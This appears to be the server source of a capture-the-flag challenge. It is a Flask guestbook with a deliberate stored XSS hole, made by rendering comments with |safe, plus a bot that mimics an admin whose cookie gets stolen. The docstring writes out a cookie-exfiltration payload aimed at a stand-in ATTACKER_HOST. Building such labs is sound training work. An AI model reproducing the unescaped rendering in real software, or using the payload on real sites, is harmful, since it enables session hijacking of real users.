"""
web-xss-stored: a public guestbook with a classic Stored XSS
vulnerability, plus a simulated "admin visits the page" bot so the
exploit has a real victim (the same role a headless-browser-driven
admin plays in a real bug-bounty "blind XSS" report).

The app stores guestbook comments and renders them back UNESCAPED. An
attacker can store an HTML/JS payload once, and it runs for every
future visitor -- including the admin bot, which periodically loads the
guestboard using its own authenticated session cookie.

No real browser or JS engine runs in this container (kept dependency-
free on purpose, see main.md's design notes). Instead, the admin bot is
a small, faithful model of what a browser does when it executes the
*standard* cookie-exfiltration payload:

    <img src=x onerror="fetch('http://ATTACKER_HOST/steal?c='+document.cookie)">

The bot looks for exactly that shape (an `onerror` handler containing a
`fetch(...)` call whose argument is `<url>' + document.cookie`),
and -- instead of running a JS interpreter -- performs the equivalent
HTTP request itself: GET `<url>?c=<its real cookie value>`. This is not
a shortcut that skips the vulnerability; it is what a real browser
executing that exact payload would do over the wire. Any other payload
shape the bot doesn't recognize simply does nothing, same as it would
if the server correctly escaped the output in the first place.

Once the attacker has the admin's stolen session cookie, logging in
to /admin with it reveals the flag -- the actual objective isn't the
cookie itself, it's the privileged page it unlocks.
"""
import os
import re
import secrets
import threading
import time

import requests
from flask import Flask, render_template_string, request

app = Flask(__name__)
FLAG_PATH = os.environ.get("FLAG_PATH", "/flag.txt")

ADMIN_SESSION = secrets.token_hex(16)  # the "prize" an attacker is after
BOT_INTERVAL = float(os.environ.get("BOT_INTERVAL_SECONDS", "2"))
SELF_URL = os.environ.get("SELF_URL", "http://127.0.0.1:5000")

COMMENTS = []
_lock = threading.Lock()

EXFIL_PATTERN = re.compile(
    r"""onerror\s*=\s*["'][^"']*fetch\(\s*['"]([^'"]+)['"]\s*\+\s*document\.cookie[^"']*["']""",
    re.IGNORECASE,
)


def read_current_flag() -> str:
    try:
        with open(FLAG_PATH) as f:
            return f.read().strip()
    except OSError:
        return "FLAG{missing_flag_file}"


PAGE = """
<!doctype html>
<title>Guestbook</title>
<h2>Guestbook</h2>
<form method="POST" action="/board">
  Name: <input name="name"><br>
  Message: <input name="message" size="60"><br>
  <button type="submit">Post</button>
</form>
<hr>
{% for c in comments %}
  <p><b>{{ c.name|safe }}</b>: {{ c.message|safe }}</p>
{% endfor %}
"""


@app.route("/board", methods=["GET", "POST"])
def board():
    if request.method == "POST":
        name = request.form.get("name", "anon")[:80]
        message = request.form.get("message", "")[:500]
        # --- VULNERABLE: stored, then rendered with |safe, i.e. with NO
        # HTML-escaping at all. Anything an attacker posts here runs in
        # the browser of every future visitor, admin bot included. ------
        with _lock:
            COMMENTS.append({"name": name, "message": message})
        # -------------------------------------------------------------------
    with _lock:
        comments = list(COMMENTS)
    return render_template_string(PAGE, comments=comments)


@app.route("/admin")
def admin():
    session = request.cookies.get("session") or request.args.get("session", "")
    if session != ADMIN_SESSION:
        return "Access denied: not logged in as admin.", 403
    return f"Welcome, admin. The flag is: {read_current_flag()}"


def admin_bot():
    """Simulates the admin periodically browsing the guestbook with their
    real session cookie -- the "victim" every stored-XSS attack needs."""
    while True:
        time.sleep(BOT_INTERVAL)
        try:
            resp = requests.get(
                f"{SELF_URL}/board", cookies={"session": ADMIN_SESSION}, timeout=3
            )
        except requests.RequestException:
            continue

        for match in EXFIL_PATTERN.finditer(resp.text):
            exfil_url = match.group(1)
            try:
                requests.get(
                    exfil_url,
                    params={"c": f"session={ADMIN_SESSION}"},
                    timeout=3,
                )
            except requests.RequestException:
                pass


if __name__ == "__main__":
    threading.Thread(target=admin_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=5000)
